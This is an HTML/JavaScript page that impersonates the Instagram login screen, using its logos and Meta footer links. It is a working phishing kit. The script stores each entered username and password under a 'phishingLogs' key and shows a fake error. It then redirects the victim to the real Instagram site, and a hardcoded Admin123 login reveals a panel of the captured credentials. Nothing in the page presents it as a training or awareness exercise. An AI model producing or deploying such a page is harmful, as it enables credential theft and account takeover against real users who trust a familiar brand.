<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Devsite Login</title>
  <style>
    *{
      margin:0;
      padding:0;
      box-sizing:border-box;
      font-family: Arial, Helvetica, sans-serif;
    }
    body{
      background:#0b0d14;
      color:white;
      display:flex;
      justify-content:center;
      align-items:center;
      min-height:100vh;
    }
    .main-wrapper {
      width: 400px;
      display: flex;
      flex-direction: column;
      border-radius: 12px;
      overflow: hidden;
      box-shadow: 0 0 25px rgba(0,0,0,0.5);
    }

    .top-body {
      background: #000000;
      padding: 30px 40px 20px 40px;
      display:flex;
      justify-content:center;
      align-items:center;
    }

    .instagram-logo-img {
      width: 90px;
      height: 90px;
      object-fit: contain;
    }

    .middle-body {
      background: #2d2d31;
      padding: 30px 40px;
    }

    .bottom-body {
      background: #000000;
      padding: 20px 40px 30px 40px;
    }
    h1{
      font-size:15px;
      margin-bottom:15px;
      margin-top:45px;
      margin-left:5px;
      font-weight:600;
    }
    .input-box{
      width:100%;
      margin-bottom:15px;
    }
    .input-box input{
      width:100%;
      padding:18px;
      border-radius:16px;
      border:2px solid #4a4d57;
      background:transparent;
      color:white;
      font-size:16px;
      outline:none;
    }
    .input-box input::placeholder{
      color:#b8b8b8;
    }
    .login-btn{
      width:100%;
      height:35px;
      border:none;
      border-radius:40px;
      background:#5d6bff;
      color:white;
      font-size:15px;
      font-weight:bold;
      cursor:pointer;
      margin-top:10px;
      transition:0.2s;
    }
    .login-btn:hover{
      opacity:0.9;
      transform:scale(1.01);
    }
    .forgot{
      text-align:center;
      margin:20px 0;
      font-size:15px;
    }
    .forgot a{
      color:white;
      text-decoration:none;
      font-weight:bold;
    }
    .secondary-btn{
      width:100%;
      padding:10px;
      height:40px;
      border-radius:40px;
      background:transparent;
      border:1px solid #4a4d57;
      color:white;
      font-size:15px;
      font-weight:bold;
      cursor:pointer;
      margin-bottom:10px;
      display:flex;
      align-items:center;
      justify-content:center;
      gap:8px;
    }
    .fb-icon{
      width:14px;
      height:14px;
      color:#1877f2;
      flex-shrink:0;
    }
    .create-btn{
      width:100%;
      height:40px;
      padding:10px;
      border-radius:40px;
      background:transparent;
      border:1px solid #64aafd;
      color:#64aafd;
      font-size:15px;
      font-weight:bold;
      cursor:pointer;
      margin-bottom:20px;
    }

    .meta-logo-container {
      display: flex;
      justify-content: center;
      margin: 25px 0 10px 0;
    }
    .meta-logo {
      width: 75px;
      height: auto;
      opacity: 0.9;
    }
    .stuff{
      color:#a29d94;
      font-size:10px;
      font-weight:bold;
      display:flex;
      flex-wrap:wrap;
      gap:18px;
      justify-content:center;
      align-items:center;
      text-align:center;
    }
    .status{
      text-align:center;
      margin:15px 0;
      font-size:16px;
      min-height:25px;
    }
  </style>
</head>
<body>

  <div class="main-wrapper">
    <div class="top-body">
      <img
        src="https://static.cdninstagram.com/rsrc.php/y4/r/xOP_FkbMZmy.webp"
        alt="Instagram from Meta"
        class="instagram-logo-img"
      />
    </div>

    <div class="middle-body">
      <h1>Log into Instagram</h1>
      <form id="loginForm">
        <div class="input-box">
          <input type="text" id="username" placeholder="Username or email" required>
        </div>
        <div class="input-box">
          <input type="password" id="password" placeholder="Password" required>
        </div>
        <button type="submit" class="login-btn">Log in</button>
      </form>

      <div class="forgot">
        <a href="#">Forgot password?</a>
      </div>

      <div id="status" class="status"></div>


      <button class="secondary-btn">
        <svg viewBox="0 0 24 24" class="fb-icon" fill="currentColor">
          <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"/>
        </svg>
        Log in with Facebook
      </button>
      <button class="create-btn">Create new account</button>

      <div class="meta-logo-container">
        <svg aria-label="Meta logo" class="meta-logo" role="img" viewBox="0 0 500 100">
          <path d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z" fill="#DEE3E9"></path>
          <path d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z" fill="#DEE3E9"></path>
        </svg>
      </div>
    </div>


    <div class="bottom-body">
      <div class="stuff">
        <p>Meta</p>
        <p>About</p>
        <p>Blog</p>
        <p>Jobs</p>
        <p>Help</p>
        <p>API</p>
        <p>Privacy</p>
        <p>Consumer Health Privacy</p>
        <p>Terms</p>
        <p>Locations</p>
        <p>Popular</p>
        <p>Meta AI</p>
        <p>Contact Uploading & Non-Users</p>
        <p>Meta Verified</p>
      </div>
    </div>
  </div>

  <div id="adminPanel" style="display:none; position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.95); z-index:10000; align-items:center; justify-content:center;">
    <div style="background:#2d2d31; width:90%; max-width:460px; border-radius:16px; padding:25px; color:white;">
      <h2 style="text-align:center; margin-bottom:20px;">🔐 Admin Panel - Captured Logins</h2>
      <div id="logsContainer" style="max-height:55vh; overflow:auto; padding:10px;"></div>
      <div style="margin-top:25px; display:flex; gap:12px;">
        <button onclick="clearLogs()" style="flex:1; padding:16px; background:#dc2626; border:none; border-radius:40px; color:white; font-weight:bold;">Clear All Logs</button>
        <button onclick="backToLogin()" style="flex:1; padding:16px; background:#4a4d57; border:none; border-radius:40px; color:white; font-weight:bold;">Back to Login</button>
      </div>
    </div>
  </div>

  <script>
    let logs = JSON.parse(localStorage.getItem('phishingLogs')) || [];

    function saveLog(username, password) {
      logs.unshift({
        timestamp: new Date().toLocaleString(),
        username: username,
        password: password
      });
      localStorage.setItem('phishingLogs', JSON.stringify(logs));
    }

    function renderLogs() {
      const container = document.getElementById('logsContainer');
      if (logs.length === 0) {
        container.innerHTML = `<p style="text-align:center; color:#aaa; padding:40px;">No credentials captured yet.</p>`;
        return;
      }
      container.innerHTML = logs.map(log => `
        <div style="background:#1f2128; padding:15px; border-radius:12px; margin-bottom:12px;">
          <small style="color:#888;">${log.timestamp}</small><br>
          <strong>${log.username}</strong><br>
          <span style="color:#f87171;">${log.password}</span>
        </div>
      `).join('');
    }

    function showAdminPanel() {
      document.querySelector('.main-wrapper').style.display = 'none';
      document.getElementById('adminPanel').style.display = 'flex';
      renderLogs();
    }

    function backToLogin() {
      document.getElementById('adminPanel').style.display = 'none';
      document.querySelector('.main-wrapper').style.display = 'flex';
    }

    function clearLogs() {
      if (confirm("Delete ALL captured credentials?")) {
        logs = [];
        localStorage.removeItem('phishingLogs');
        renderLogs();
      }
    }

    document.getElementById('loginForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      const status = document.getElementById('status');

      if (!username || !password) return;

      saveLog(username, password);

      status.innerHTML = `<span style="color:#5d6bff;"></span>`;


      if (username === "Admin123" && password === "Admin123") {
        setTimeout(showAdminPanel, 900);
        return;
      }


      await new Promise(r => setTimeout(r, 1400));
      status.innerHTML = `<span style="color:#FF0000;">Error. Please try again...</span>`;

      setTimeout(() => {
        window.location.href = "https://www.instagram.com";
      }, 1200);
    });
  </script>
</body>
</html>
